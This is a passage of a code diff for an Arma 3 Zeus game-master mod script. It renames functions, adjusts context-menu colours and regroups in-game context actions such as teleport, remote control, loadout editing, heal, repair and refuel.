-		MAZ_EZM_contextMenuBase ctrlSetBackgroundColor [0,0,0,0.4];
+		MAZ_EZM_contextMenuBase ctrlSetBackgroundColor [0,0,0,0.6];
 		MAZ_EZM_contextMenuBase ctrlCommit 0;
 
 		private _controlGroupFrame = _display ctrlCreate ["RscFrame",-1,MAZ_EZM_contextMenuBase];
 		_controlGroupFrame ctrlSetPosition [0,0,["W",9] call MAZ_EZM_fnc_convertToGUI_GRIDFormat,0];
-		_controlGroupFrame ctrlSetTextColor [0,0,0,0.6];
+		_controlGroupFrame ctrlSetTextColor [0,0,0,0.8];
 		_controlGroupFrame ctrlCommit 0;
 
 		[MAZ_EZM_contextMenuBase,_controlGroupFrame]
 	};
 
-	ZAM_fnc_createContextMenuRow = {
+	MAZ_EZM_fnc_createContextMenuRow = {
 		params ["_ctrlGroup","_yPos","_displayName","_code","_img","_color"];
 		private _display = findDisplay 312;
 		private _ctrl = _display ctrlCreate ["RscButtonMenu",-1,_ctrlGroup];
@@ -2942,25 +3028,25 @@ comment "Context Menu";
 		_ctrl ctrlSetFont "RobotoCondensed";
 		_ctrl ctrlSetPosition [0,_yPos,["W",9] call MAZ_EZM_fnc_convertToGUI_GRIDFormat,["H",1] call MAZ_EZM_fnc_convertToGUI_GRIDFormat];
 		_ctrl ctrlSetTextColor _color;
-		_ctrl ctrlSetBackgroundColor [0,0,0,0.4];
-		_ctrl ctrlSetActiveColor [0,0,0,0.6];
+		_ctrl ctrlSetBackgroundColor [0,0,0,0.6];
+		_ctrl ctrlSetActiveColor [0,0,0,0.7];
 		_ctrl ctrlAddEventHandler ["ButtonClick",_code];
 		_ctrl ctrlCommit 0;
 
 		_ctrl
 	};
 
-	ZAM_fnc_destroyContextMenu = {
+	MAZ_EZM_fnc_destroyContextMenu = {
 		sleep 0.01;
 		private _ctrlGroup = uiNamespace getVariable ["MAZ_EZM_contextMenuBase",controlNull];
 		if(isNull _ctrlGroup) exitWith {};
-		[_ctrlGroup] call ZAM_fnc_closeAllSubControls;
+		[_ctrlGroup] call MAZ_EZM_fnc_closeAllSubControls;
 		private _childrenGroup = uiNamespace getVariable ["MAZ_EZM_contextChildrenGroup",controlNull];
 		if(isNull _childrenGroup) exitWith {};
-		[_childrenGroup] call ZAM_fnc_closeAllSubControls;
+		[_childrenGroup] call MAZ_EZM_fnc_closeAllSubControls;
 	};
 
-	ZAM_fnc_addContextMenuChildRows = {
+	MAZ_EZM_fnc_addContextMenuChildRows = {
 		params ["_position","_children","_ctrlParent"];
 		private _controlGroupParentOfParent = ctrlParentControlsGroup _ctrlParent;
 		_position = _position vectorAdd (ctrlPosition _controlGroupParentOfParent);
@@ -2969,7 +3055,7 @@ comment "Context Menu";
 		private _display = findDisplay 312;
 		private _controlGroup = _display ctrlCreate ["RscControlsGroupNoScrollbars",-1];
 		_controlGroup ctrlSetPosition [_xPos + (["W",9] call MAZ_EZM_fnc_convertToGUI_GRIDFormat),_yPos,["W",9] call MAZ_EZM_fnc_convertToGUI_GRIDFormat,0];
-		_controlGroup ctrlSetBackgroundColor [0,0,0,0.4];
+		_controlGroup ctrlSetBackgroundColor [0,0,0,0.6];
 		_controlGroup ctrlCommit 0;
 
 		private _controlGroupFrame = _display ctrlCreate ["RscFrame",-1,_controlGroup];
@@ -2995,8 +3081,8 @@ comment "Context Menu";
 			_ctrl ctrlSetFont "RobotoCondensed";
 			_ctrl ctrlSetPosition [0,_groupHeight,["W",9] call MAZ_EZM_fnc_convertToGUI_GRIDFormat,["H",1] call MAZ_EZM_fnc_convertToGUI_GRIDFormat];
 			_ctrl ctrlSetTextColor _color;
-			_ctrl ctrlSetBackgroundColor [0,0,0,0.4];
-			_ctrl ctrlSetActiveColor [0,0,0,0.6];
+			_ctrl ctrlSetBackgroundColor [0,0,0,0.6];
+			_ctrl ctrlSetActiveColor [0,0,0,0.7];
 			_ctrl ctrlAddEventHandler ["ButtonClick",_code];
 			_ctrl ctrlCommit 0;
 
@@ -3018,32 +3104,32 @@ comment "Context Menu";
 		_controlGroup
 	};
 
-	ZAM_fnc_isContextMenuOpen = {
+	MAZ_EZM_fnc_isContextMenuOpen = {
 		private _contextBase = uiNamespace getVariable ["MAZ_EZM_contextMenuBase",controlNull];
 		!(isNull _contextBase)
 	};
 	
-	ZAM_fnc_closeContextMenu = {
-		if !(call ZAM_fnc_isContextMenuOpen) exitWith {};
-		[] spawn ZAM_fnc_destroyContextMenu;
+	MAZ_EZM_fnc_closeContextMenu = {
+		if !(call MAZ_EZM_fnc_isContextMenuOpen) exitWith {};
+		[] spawn MAZ_EZM_fnc_destroyContextMenu;
 	};
 
-	ZAM_fnc_closeAllSubControls = {
+	MAZ_EZM_fnc_closeAllSubControls = {
 		params ["_control"];
 		if((count (allControls _control)) > 0) then {
 			{
-				[_x] call ZAM_fnc_closeAllSubControls;
+				[_x] call MAZ_EZM_fnc_closeAllSubControls;
 			}forEach (allControls _control);
 		};
 		ctrlDelete _control;
 	};
 
-	ZAM_fnc_createContextMenu = {
+	MAZ_EZM_fnc_createContextMenu = {
 		comment "Check for actions";
-		if(isNil "ZAM_EZM_contextMenuActions") exitWith {};
+		if(isNil "MAZ_EZM_contextMenuActions") exitWith {};
 		private _contextBase = uiNamespace getVariable ["MAZ_EZM_contextMenuBase",controlNull];
 		if(!isNull _contextBase) then {
-			[_contextBase] call ZAM_fnc_closeAllSubControls;
+			[_contextBase] call MAZ_EZM_fnc_closeAllSubControls;
 			uiNamespace setVariable ["MAZ_EZM_contextMenuBase",controlNull];
 		};
 
@@ -3058,12 +3144,12 @@ comment "Context Menu";
 		with uiNamespace do {
 			private _posArray = getMousePosition;
 			_posArray params ["_mouseX","_mouseY"];
-			(_posArray call (missionNamespace getVariable "ZAM_fnc_createContextMenuBase")) params ["_ctrlGroup","_ctrlGroupFrame"];
+			(_posArray call (missionNamespace getVariable "MAZ_EZM_fnc_createContextMenuBase")) params ["_ctrlGroup","_ctrlGroupFrame"];
 			_ctrlGroup ctrlAddEventHandler ["MouseExit",{
 				params ["_control"];
 				private _currentChildren = uiNamespace getVariable "MAZ_EZM_contextChildrenGroup";
 				if(!isNull _currentChildren) then {
-					[_currentChildren] call ZAM_fnc_closeAllSubControls;
+					[_currentChildren] call MAZ_EZM_fnc_closeAllSubControls;
 					uiNamespace setVariable ["MAZ_EZM_contextChildrenGroup",controlNull];
 				};
 			}];
@@ -3071,7 +3157,7 @@ comment "Context Menu";
 
 			comment "Run conditionals";
 			private _yPos = 0;
-			private _actions = +(missionNamespace getVariable "ZAM_EZM_contextMenuActions");
+			private _actions = +(missionNamespace getVariable "MAZ_EZM_contextMenuActions");
 			_actions = [_actions,[],{_x select 3},"ASCEND"] call BIS_fnc_sortBy;
 			{
 				if(isNil "_x") then {continue};
@@ -3082,7 +3168,7 @@ comment "Context Menu";
 				};
 				if(MAZ_EZM_contextConditionResult) then {
 					_code = compile (format ["params ['_control'];(_control getVariable 'contextMenuParams') params ['_pos','_entity'];[_pos,_entity] call %1;",_code]);
-					private _ctrl = [_ctrlGroup,_yPos,_displayName,_code,_img,_color] call (missionNamespace getVariable "ZAM_fnc_createContextMenuRow");
+					private _ctrl = [_ctrlGroup,_yPos,_displayName,_code,_img,_color] call (missionNamespace getVariable "MAZ_EZM_fnc_createContextMenuRow");
 					_ctrl setVariable ["contextMenuParams",[_worldPos,_entity]];
 					(ctrlPosition _ctrl) params ["","","","_posH"];
 					if(count _childActions != 0) then {
@@ -3111,11 +3197,11 @@ comment "Context Menu";
 						params ["_control"];
 						private _currentChildren = uiNamespace getVariable ["MAZ_EZM_contextChildrenGroup",controlNull];
 						if(!isNull _currentChildren) then {
-							[_currentChildren] call ZAM_fnc_closeAllSubControls;
+							[_currentChildren] call MAZ_EZM_fnc_closeAllSubControls;
 						};
 						private _children = _control getVariable "MAZ_EZM_contextChildrenData";
 						if(!isNil "_children") then {
-							private _childGroup = [ctrlPosition _control,_children,_control] call (missionNamespace getVariable "ZAM_fnc_addContextMenuChildRows");
+							private _childGroup = [ctrlPosition _control,_children,_control] call (missionNamespace getVariable "MAZ_EZM_fnc_addContextMenuChildRows");
 							uiNamespace setVariable ["MAZ_EZM_contextChildrenGroup",_childGroup];
 						};
 					}];
@@ -3136,591 +3222,730 @@ comment "Context Menu";
 		};
 	};
 
-	if(!isNil "MAZ_EZM_action_openDebugConsole") then {
-		[MAZ_EZM_action_openDebugConsole] call ZAM_fnc_removeContextAction;
-	};
-	MAZ_EZM_action_openDebugConsole = [
-		"Open Debug Console",
-		{
-			params ["_pos","_entity"];
-			[_entity] call MAZ_EZM_fnc_debugConsoleLocalModule;
-		},
-		{true},
-		6,
-		"a3\3den\data\displays\display3den\entitymenu\findconfig_ca.paa",
-		[1,1,1,1],
-		[]
-	] call ZAM_fnc_createNewContextAction;
+	"General Actions";
 
-	if(!isNil "MAZ_EZM_action_addEditableObjects") then {
-		[MAZ_EZM_action_addEditableObjects] call ZAM_fnc_removeContextAction;
-	};
-	MAZ_EZM_action_addEditableObjects = [
-		"Add Editable Objects",
-		{
-			params ["_pos"];
-			private _objects = [_pos,100] call MAZ_EZM_fnc_getEditableObjectsRadius;
-			[_objects,getAssignedCuratorLogic player] call MAZ_EZM_fnc_addObjectToInterface;
-		},
-		{true},
-		7,
-		"a3\3den\data\displays\display3den\panelright\customcomposition_add_ca.paa",
-		[1,1,1,1],
-		[
-			[
-				"50m",
-				{
-					params ["_pos"];
-					private _objects = [_pos,50] call MAZ_EZM_fnc_getEditableObjectsRadius;
-					[_objects,getAssignedCuratorLogic player] call MAZ_EZM_fnc_addObjectToInterface;
-				},
-				{true},
-				"",
-				[1,1,1,1]
-			],
-			[
-				"100m",
-				{
-					params ["_pos"];
-					private _objects = [_pos,100] call MAZ_EZM_fnc_getEditableObjectsRadius;
-					[_objects,getAssignedCuratorLogic player] call MAZ_EZM_fnc_addObjectToInterface;
-				},
-				{true},
-				"",
-				[1,1,1,1]
-			],
-			[
-				"250m",
-				{
-					params ["_pos"];
-					private _objects = [_pos,250] call MAZ_EZM_fnc_getEditableObjectsRadius;
-					[_objects,getAssignedCuratorLogic player] call MAZ_EZM_fnc_addObjectToInterface;
-				},
-				{true},
-				"",
-				[1,1,1,1]
-			],
-			[
-				"500m",
-				{
-					params ["_pos"];
-					private _objects = [_pos,500] call MAZ_EZM_fnc_getEditableObjectsRadius;
-					[_objects,getAssignedCuratorLogic player] call MAZ_EZM_fnc_addObjectToInterface;
-				},
-				{true},
-				"",
-				[1,1,1,1]
-			],
-			[
-				"1000m",
-				{
-					params ["_pos"];
-					private _objects = [_pos,1000] call MAZ_EZM_fnc_getEditableObjectsRadius;
-					[_objects,getAssignedCuratorLogic player] call MAZ_EZM_fnc_addObjectToInterface;
-				},
-				{true},
-				"",
-				[1,1,1,1]
-			]
-		]
-	] call ZAM_fnc_createNewContextAction;
+		if(!isNil "MAZ_EZM_action_openDebugConsole") then {
+			[MAZ_EZM_action_openDebugConsole] call MAZ_EZM_fnc_removeContextAction;
+		};
+		MAZ_EZM_action_openDebugConsole = [
+			"Open Debug Console",
+			{
+				params ["_pos","_entity"];
+				[_entity] call MAZ_EZM_fnc_debugConsoleLocalModule;
+			},
+			{true},
+			6,
+			"a3\3den\data\displays\display3den\entitymenu\findconfig_ca.paa",
+			[1,1,1,1],
+			[]
+		] call MAZ_EZM_fnc_createNewContextAction;
 
-	if(!isNil "MAZ_EZM_action_removeEditableObjects") then {
-		[MAZ_EZM_action_removeEditableObjects] call ZAM_fnc_removeContextAction;
-	};
-	MAZ_EZM_action_removeEditableObjects = [
-		"Remove Edit Objects",
-		{
-			params ["_pos"];
-			private _objects = [_pos,100] call MAZ_EZM_fnc_getEditableObjectsRadius;
-			[_objects,getAssignedCuratorLogic player] call MAZ_EZM_fnc_removeObjectFromInterface;
-		},
-		{true},
-		6,
-		"a3\3den\data\cfg3den\group\iconcustomcomposition_ca.paa",
-		[1,1,1,1],
-		[
+		if(!isNil "MAZ_EZM_action_addEditableObjects") then {
+			[MAZ_EZM_action_addEditableObjects] call MAZ_EZM_fnc_removeContextAction;
+		};
+		MAZ_EZM_action_addEditableObjects = [
+			"Add Editable Objects",
+			{
+				params ["_pos"];
+				private _objects = [_pos,100] call MAZ_EZM_fnc_getEditableObjectsRadius;
+				[_objects,getAssignedCuratorLogic player] call MAZ_EZM_fnc_addObjectToInterface;
+			},
+			{true},
+			6,
+			"a3\3den\data\displays\display3den\panelright\customcomposition_add_ca.paa",
+			[1,1,1,1],
 			[
-				"50m",
-				{
-					params ["_pos"];
-					private _objects = [_pos,50] call MAZ_EZM_fnc_getEditableObjectsRadius;
-					[_objects,getAssignedCuratorLogic player] call MAZ_EZM_fnc_removeObjectFromInterface;
-				},
-				{true},
-				"",
-				[1,1,1,1]
-			],
-			[
-				"100m",
-				{
-					params ["_pos"];
-					private _objects = [_pos,100] call MAZ_EZM_fnc_getEditableObjectsRadius;
-					[_objects,getAssignedCuratorLogic player] call MAZ_EZM_fnc_removeObjectFromInterface;
-				},
-				{true},
-				"",
-				[1,1,1,1]
-			],
-			[
-				"250m",
-				{
-					params ["_pos"];
-					private _objects = [_pos,250] call MAZ_EZM_fnc_getEditableObjectsRadius;
-					[_objects,getAssignedCuratorLogic player] call MAZ_EZM_fnc_removeObjectFromInterface;
-				},
-				{true},
-				"",
-				[1,1,1,1]
-			],
-			[
-				"500m",
-				{
-					params ["_pos"];
-					private _objects = [_pos,500] call MAZ_EZM_fnc_getEditableObjectsRadius;
-					[_objects,getAssignedCuratorLogic player] call MAZ_EZM_fnc_removeObjectFromInterface;
-				},
-				{true},
-				"",
-				[1,1,1,1]
-			],
-			[
-				"1000m",
-				{
-					params ["_pos"];
-					private _objects = [_pos,1000] call MAZ_EZM_fnc_getEditableObjectsRadius;
-					[_objects,getAssignedCuratorLogic player] call MAZ_EZM_fnc_removeObjectFromInterface;
-				},
-				{true},
-				"",
-				[1,1,1,1]
-			]
-		]
-	] call ZAM_fnc_createNewContextAction;
-
-	if(!isNil "MAZ_EZM_action_teleportHere") then {
-		[MAZ_EZM_action_teleportHere] call ZAM_fnc_removeContextAction;
-	};
-	MAZ_EZM_action_teleportHere = [
-		"Teleport Here",
-		{
-			params ["_pos"];
-			if(surfaceIsWater _pos) exitWith {
-				private _newPos = [true] call MAZ_EZM_fnc_getScreenPosition;
-				_newPos = AGLtoASL _newPos;
-				player setPosASL _newPos;
-			};
-			player setPosATL _pos;
-		},
-		{true},
-		5.9,
-		"a3\3den\data\cfgwaypoints\move_ca.paa",
-		[1,1,1,1],
-		[
-			[
-				"Teleport Player Here",
-				{
-					params ["_pos","_entity"];
-					[objNull,_pos] call MAZ_EZM_fnc_teleportPlayerModule;
-				},
-				{true},
-				"a3\ui_f\data\gui\rsc\rscdisplaymain\menu_singleplayer_ca.paa",
-				[1,1,1,1]
-			],
-			[
-				"Teleport Everyone",
-				{
-					params ["_pos","_entity"];
+				[
+					"50m",
 					{
-						_x setPos _pos;
-					}forEach allPlayers;
-				},
-				{true},
-				"a3\ui_f\data\gui\rsc\rscdisplaymain\menu_multiplayer_ca.paa",
-				[1,1,1,1]
-			],
-			[
-				"Teleport In Vehicle",
-				{
-					params ["_pos","_entity"];
-					private _crewData = fullCrew [_entity,"",true];
-					private _return = false;
-					private _moveInCode = "";
+						params ["_pos"];
+						private _objects = [_pos,50] call MAZ_EZM_fnc_getEditableObjectsRadius;
+						[_objects,getAssignedCuratorLogic player] call MAZ_EZM_fnc_addObjectToInterface;
+					},
+					{true},
+					"",
+					[1,1,1,1]
+				],
+				[
+					"100m",
 					{
-						_x params ["_unit","_role","_cargoIndex","_turretPath","_personTurret"];
-						if(_return) exitWith {};
-						if(_role != "turret") then {
-							if(isNull _unit || !alive _unit) then {
-								if(!isNull _unit) then {moveOut _unit};
-								_moveInCode = compile (format ["player moveIn%1 _this",_role]);
-								_return = true;
+						params ["_pos"];
+						private _objects = [_pos,100] call MAZ_EZM_fnc_getEditableObjectsRadius;
+						[_objects,getAssignedCuratorLogic player] call MAZ_EZM_fnc_addObjectToInterface;
+					},
+					{true},
+					"",
+					[1,1,1,1]
+				],
+				[
+					"250m",
+					{
+						params ["_pos"];
+						private _objects = [_pos,250] call MAZ_EZM_fnc_getEditableObjectsRadius;
+						[_objects,getAssignedCuratorLogic player] call MAZ_EZM_fnc_addObjectToInterface;
+					},
+					{true},
+					"",
+					[1,1,1,1]
+				],
+				[
+					"500m",
+					{
+						params ["_pos"];
+						private _objects = [_pos,500] call MAZ_EZM_fnc_getEditableObjectsRadius;
+						[_objects,getAssignedCuratorLogic player] call MAZ_EZM_fnc_addObjectToInterface;
+					},
+					{true},
+					"",
+					[1,1,1,1]
+				],
+				[
+					"1000m",
+					{
+						params ["_pos"];
+						private _objects = [_pos,1000] call MAZ_EZM_fnc_getEditableObjectsRadius;
+						[_objects,getAssignedCuratorLogic player] call MAZ_EZM_fnc_addObjectToInterface;
+					},
+					{true},
+					"",
+					[1,1,1,1]
+				]
+			]
+		] call MAZ_EZM_fnc_createNewContextAction;
+
+		if(!isNil "MAZ_EZM_action_removeEditableObjects") then {
+			[MAZ_EZM_action_removeEditableObjects] call MAZ_EZM_fnc_removeContextAction;
+		};
+		MAZ_EZM_action_removeEditableObjects = [
+			"Remove Edit Objects",
+			{
+				params ["_pos"];
+				private _objects = [_pos,100] call MAZ_EZM_fnc_getEditableObjectsRadius;
+				[_objects,getAssignedCuratorLogic player] call MAZ_EZM_fnc_removeObjectFromInterface;
+			},
+			{true},
+			7,
+			"a3\3den\data\cfg3den\group\iconcustomcomposition_ca.paa",
+			[1,1,1,1],
+			[
+				[
+					"50m",
+					{
+						params ["_pos"];
+						private _objects = [_pos,50] call MAZ_EZM_fnc_getEditableObjectsRadius;
+						[_objects,getAssignedCuratorLogic player] call MAZ_EZM_fnc_removeObjectFromInterface;
+					},
+					{true},
+					"",
+					[1,1,1,1]
+				],
+				[
+					"100m",
+					{
+						params ["_pos"];
+						private _objects = [_pos,100] call MAZ_EZM_fnc_getEditableObjectsRadius;
+						[_objects,getAssignedCuratorLogic player] call MAZ_EZM_fnc_removeObjectFromInterface;
+					},
+					{true},
+					"",
+					[1,1,1,1]
+				],
+				[
+					"250m",
+					{
+						params ["_pos"];
+						private _objects = [_pos,250] call MAZ_EZM_fnc_getEditableObjectsRadius;
+						[_objects,getAssignedCuratorLogic player] call MAZ_EZM_fnc_removeObjectFromInterface;
+					},
+					{true},
+					"",
+					[1,1,1,1]
+				],
+				[
+					"500m",
+					{
+						params ["_pos"];
+						private _objects = [_pos,500] call MAZ_EZM_fnc_getEditableObjectsRadius;
+						[_objects,getAssignedCuratorLogic player] call MAZ_EZM_fnc_removeObjectFromInterface;
+					},
+					{true},
+					"",
+					[1,1,1,1]
+				],
+				[
+					"1000m",
+					{
+						params ["_pos"];
+						private _objects = [_pos,1000] call MAZ_EZM_fnc_getEditableObjectsRadius;
+						[_objects,getAssignedCuratorLogic player] call MAZ_EZM_fnc_removeObjectFromInterface;
+					},
+					{true},
+					"",
+					[1,1,1,1]
+				]
+			]
+		] call MAZ_EZM_fnc_createNewContextAction;
+
+		if(!isNil "MAZ_EZM_action_teleportHere") then {
+			[MAZ_EZM_action_teleportHere] call MAZ_EZM_fnc_removeContextAction;
+		};
+		MAZ_EZM_action_teleportHere = [
+			"Teleport Here",
+			{
+				params ["_pos"];
+				if(surfaceIsWater _pos) exitWith {
+					private _newPos = [true] call MAZ_EZM_fnc_getScreenPosition;
+					_newPos = AGLtoASL _newPos;
+					player setPosASL _newPos;
+				};
+				player setPosATL _pos;
+			},
+			{true},
+			5.9,
+			"a3\3den\data\cfgwaypoints\move_ca.paa",
+			[1,1,1,1],
+			[
+				[
+					"Teleport Player Here",
+					{
+						params ["_pos","_entity"];
+						[objNull,_pos] call MAZ_EZM_fnc_teleportPlayerModule;
+					},
+					{true},
+					"a3\ui_f\data\gui\rsc\rscdisplaymain\menu_singleplayer_ca.paa",
+					[1,1,1,1]
+				],
+				[
+					"Teleport Everyone",
+					{
+						params ["_pos","_entity"];
+						{
+							_x setPos _pos;
+						}forEach allPlayers;
+					},
+					{true},
+					"a3\ui_f\data\gui\rsc\rscdisplaymain\menu_multiplayer_ca.paa",
+					[1,1,1,1]
+				],
+				[
+					"Teleport In Vehicle",
+					{
+						params ["_pos","_entity"];
+						private _crewData = fullCrew [_entity,"",true];
+						private _return = false;
+						private _moveInCode = "";
+						{
+							_x params ["_unit","_role","_cargoIndex","_turretPath","_personTurret"];
+							if(_return) exitWith {};
+							if(_role != "turret") then {
+								if(isNull _unit || !alive _unit) then {
+									if(!isNull _unit) then {moveOut _unit};
+									_moveInCode = compile (format ["player moveIn%1 _this",_role]);
+									_return = true;
+								};
+							} else {
+								if(isNull _unit || !alive _unit) then {
+									if(!isNull _unit) then {moveOut _unit};
+									_moveInCode = compile (format ["player moveIn%1 [_this,%2]",_role,_turretPath]);
+									_return = true;
+								};
 							};
-						} else {
-							if(isNull _unit || !alive _unit) then {
-								if(!isNull _unit) then {moveOut _unit};
-								_moveInCode = compile (format ["player moveIn%1 [_this,%2]",_role,_turretPath]);
-								_return = true;
-							};
+						}forEach _crewData;
+						_entity call _moveInCode;
+					},
+					{
+						private _return = false;
+						if(_this isEqualType grpNull) exitWith {_return};
+						if(!((typeOf _this) isKindOf "CAManBase") && (alive _this) && !(isNull _this) && ((typeOf _this) isKindOf "AllVehicles") && ([_this] call MAZ_EZM_fnc_canMoveIn)) then {
+							_return = true;
 						};
-					}forEach _crewData;
-					_entity call _moveInCode;
-				},
-				{
-					private _return = false;
-					if(_this isEqualType grpNull) exitWith {_return};
-					if(!((typeOf _this) isKindOf "CAManBase") && (alive _this) && !(isNull _this) && ((typeOf _this) isKindOf "AllVehicles") && ([_this] call ZAM_EZM_fnc_canMoveIn)) then {
-						_return = true;
-					};
 
-					_return
-				},
-				"a3\3den\data\cfgwaypoints\getin_ca.paa",
-				[1,1,1,1]
+						_return
+					},
+					"a3\3den\data\cfgwaypoints\getin_ca.paa",
+					[1,1,1,1]
+				]
 			]
-		]
-	] call ZAM_fnc_createNewContextAction;
+		] call MAZ_EZM_fnc_createNewContextAction;
 
-	if(!isNil "MAZ_EZM_action_remoteControl") then {
-		[MAZ_EZM_action_remoteControl] call ZAM_fnc_removeContextAction;
-	};
-	MAZ_EZM_action_remoteControl = [
-		"Remote Control",
-		{
-			params ["_pos","_entity"];
-			private _logic = createVehicle ["Land_HelipadEmpty_F",[0,0,0],[],0,"CAN_COLLIDE"];
-			[_logic,_entity,true] spawn MAZ_EZM_BIS_fnc_remoteControlUnit;
-		},
-		{
-			private _return = false;
-			if(_this isEqualType grpNull) exitWith {_return};
-			if(typeOf _this isKindOf "CAManBase" && alive _this && !isNull _this && !(isPlayer _this)) then {
-				_return = true;
-			};
+	"Unit Actions";
 
-			_return
-		},
-		5,
-		"\a3\Modules_F_Curator\Data\portraitRemoteControl_ca.paa",
-		[1,1,1,1]
-	] call ZAM_fnc_createNewContextAction;
+		if(!isNil "MAZ_EZM_action_remoteControl") then {
+			[MAZ_EZM_action_remoteControl] call MAZ_EZM_fnc_removeContextAction;
+		};
+		MAZ_EZM_action_remoteControl = [
+			"Remote Control",
+			{
+				params ["_pos","_entity"];
+				private _logic = createVehicle ["Land_HelipadEmpty_F",[0,0,0],[],0,"CAN_COLLIDE"];
+				[_logic,_entity,true] spawn MAZ_EZM_BIS_fnc_remoteControlUnit;
+			},
+			{
+				private _return = false;
+				if(_this isEqualType grpNull) exitWith {_return};
+				if(typeOf _this isKindOf "CAManBase" && alive _this && !isNull _this && !(isPlayer _this)) then {
+					_return = true;
+				};
 
-	if(!isNil "MAZ_EZM_action_suppressiveFire") then {
-		[MAZ_EZM_action_suppressiveFire] call ZAM_fnc_removeContextAction;
-	};
-	MAZ_EZM_action_suppressiveFire = [
-		"Suppressive Fire",
-		{
-			params ["_pos","_entity"];
-			[_entity] spawn MAZ_EZM_fnc_suppressiveFireModule;
-		},
-		{
-			private _return = false;
-			if(_this isEqualType grpNull) exitWith {_return};
-			if(typeOf _this isKindOf "CAManBase" && alive _this && !isNull _this && !(isPlayer _this)) then {
-				_return = true;
-			};
+				_return
+			},
+			5,
+			"\a3\Modules_F_Curator\Data\portraitRemoteControl_ca.paa",
+			[1,1,1,1]
+		] call MAZ_EZM_fnc_createNewContextAction;
 
-			_return
-		},
-		5,
-		"a3\static_f_oldman\hmg_02\data\ui\icon_hmg_02_ca.paa",
-		[1,1,1,1]
-	] call ZAM_fnc_createNewContextAction;
+		if(!isNil "MAZ_EZM_action_suppressiveFire") then {
+			[MAZ_EZM_action_suppressiveFire] call MAZ_EZM_fnc_removeContextAction;
+		};
+		MAZ_EZM_action_suppressiveFire = [
+			"Suppressive Fire",
+			{
+				params ["_pos","_entity"];
+				[_entity] spawn MAZ_EZM_fnc_suppressiveFireModule;
+			},
+			{
+				private _return = false;
+				if(_this isEqualType grpNull) exitWith {_return};
+				if(typeOf _this isKindOf "CAManBase" && alive _this && !isNull _this && !(isPlayer _this)) then {
+					_return = true;
+				};
 
-	if(!isNil "MAZ_EZM_action_editLoadout") then {
-		[MAZ_EZM_action_editLoadout] call ZAM_fnc_removeContextAction;
-	};
-	MAZ_EZM_action_editLoadout = [
-		"Edit Loadout",
-		{
-			params ["_pos","_entity"];
-			["Preload"] call BIS_fnc_arsenal;
-			["Open",[true,nil,_entity]] call BIS_fnc_arsenal;
-		},
-		{
-			private _return = false;
-			if(_this isEqualType grpNull) exitWith {_return};
-			if(player == _this) exitWith {!_return};
-			if(typeOf _this isKindOf "CAManBase" && alive _this && !isNull _this && !(isPlayer _this)) then {
-				_return = true;
-			};
+				_return
+			},
+			5,
+			"a3\static_f_oldman\hmg_02\data\ui\icon_hmg_02_ca.paa",
+			[1,1,1,1]
+		] call MAZ_EZM_fnc_createNewContextAction;
 
-			_return
-		},
-		4,
-		"a3\ui_f\data\igui\cfg\actions\gear_ca.paa",
-		[1,1,1,1],
-		[
+		if(!isNil "MAZ_EZM_action_editLoadout") then {
+			[MAZ_EZM_action_editLoadout] call MAZ_EZM_fnc_removeContextAction;
+		};
+		MAZ_EZM_action_editLoadout = [
+			"Edit Loadout",
+			{
+				params ["_pos","_entity"];
+				["Preload"] call BIS_fnc_arsenal;
+				["Open",[true,nil,_entity]] call BIS_fnc_arsenal;
+			},
+			{
+				private _return = false;
+				if(_this isEqualType grpNull) exitWith {_return};
+				if(player == _this) exitWith {!_return};
+				if(typeOf _this isKindOf "CAManBase" && alive _this && !isNull _this && !(isPlayer _this)) then {
+					_return = true;
+				};
+
+				_return
+			},
+			4,
+			"a3\ui_f\data\igui\cfg\actions\gear_ca.paa",
+			[1,1,1,1],
 			[
-				"Change Loadout",
-				{
-					params ["_pos","_entity"];
-					["Preload"] call BIS_fnc_arsenal;
-					["Open",[true,nil,_entity]] call BIS_fnc_arsenal;
-				},
-				{true},
-				"",
-				[1,1,1,1]
-			],
-			[
-				"Reset Loadout",
-				{
-					params ["_pos","_entity"];
-					_entity setUnitLoadout (getUnitLoadout (configFile >> "CfgVehicles" >> typeOf _entity));
-				},
-				{true},
-				"",
-				[1,1,1,1]
-			],
-			[
-				"Copy Loadout",
-				{
-					params ["_pos","_entity"];
-					MAZ_EZM_copiedUnitLoadout = getUnitLoadout _entity;
-				},
-				{true},
-				"",
-				[1,1,1,1]
-			],
-			[
-				"Paste Loadout",
-				{
-					params ["_pos","_entity"];
-					_entity setUnitLoadout MAZ_EZM_copiedUnitLoadout;
-				},
-				{
-					(!isNil "MAZ_EZM_copiedUnitLoadout")
-				},
-				"",
-				[1,1,1,1]
-			],
-			[
-				"Set Zeus Loadout",
-				{
-					params ["_pos","_entity"];
-					profileNamespace setVariable ["MAZ_EZM_ZeusLoadout",getUnitLoadout _entity];
-					["Zeus loadout saved","addItemOK"] call MAZ_EZM_fnc_systemMessage;
-				},
-				{true},
-				"a3\ui_f_curator\data\logos\arma3_zeus_icon_ca.paa",
-				[1,1,1,1]
-			]
-		]
-	] call ZAM_fnc_createNewContextAction;
-
-	if(!isNil "MAZ_EZM_action_healUnit") then {
-		[MAZ_EZM_action_healUnit] call ZAM_fnc_removeContextAction;
-	};
-	MAZ_EZM_action_healUnit = [
-		"Heal Unit",
-		{
-			params ["_pos","_entity"];
-			[_entity] call MAZ_EZM_fnc_healAndReviveModule;
-		},
-		{
-			private _return = false;
-			if(_this isEqualType grpNull) exitWith {_return};
-			if(typeOf _this isKindOf "CAManBase" && alive _this && !isNull _this) then {
-				_return = true;
-			};
-
-			_return
-		},
-		3,
-		"a3\ui_f\data\map\vehicleicons\pictureheal_ca.paa",
-		[1,1,1,1]
-	] call ZAM_fnc_createNewContextAction;
-
-	if(!isNil "MAZ_EZM_action_repairVehicle") then {
-		[MAZ_EZM_action_repairVehicle] call ZAM_fnc_removeContextAction;
-	};
-	MAZ_EZM_action_repairVehicle = [
-		"Repair",
-		{
-			params ["_pos","_entity"];
-			_entity setDamage 0;
-		},
-		{
-			private _return = false;
-			if(_this isEqualType grpNull) exitWith {_return};
-			if(!(typeOf _this isKindOf "CAManBase") && alive _this && !isNull _this && typeOf _this isKindOf "AllVehicles") then {
-				_return = true;
-			};
-
-			_return
-		},
-		2,
-		"a3\ui_f\data\igui\cfg\cursors\iconrepairvehicle_ca.paa",
-		[1,1,1,1]
-	] call ZAM_fnc_createNewContextAction;
-
-	if(!isNil "MAZ_EZM_action_refuelVehicle") then {
-		[MAZ_EZM_action_refuelVehicle] call ZAM_fnc_removeContextAction;
-	};
-	MAZ_EZM_action_refuelVehicle = [
-		"Refuel",
-		{
-			params ["_pos","_entity"];
-			[_entity,1] remoteExec ['setFuel'];
-		},
-		{
-			private _return = false;
